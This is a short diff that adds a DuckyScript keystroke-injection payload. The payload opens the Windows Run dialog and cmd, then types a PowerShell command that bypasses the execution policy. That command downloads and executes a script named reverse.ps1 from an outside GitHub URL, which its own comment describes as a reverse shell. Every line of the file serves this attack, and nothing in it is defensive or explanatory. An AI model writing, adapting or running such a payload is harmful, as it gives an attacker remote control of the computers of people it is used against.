@@ -1,0 +1,12 @@
+DELAY 500
+REM Open Run dialog
+GUI r
+DELAY 500
+REM Open cmd
+STRING cmd
+ENTER
+DELAY 500
+REM Create a PowerShell reverse shell
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Tumelo0321/code25/refs/heads/main/reverse.ps1')"
+ENTER
+
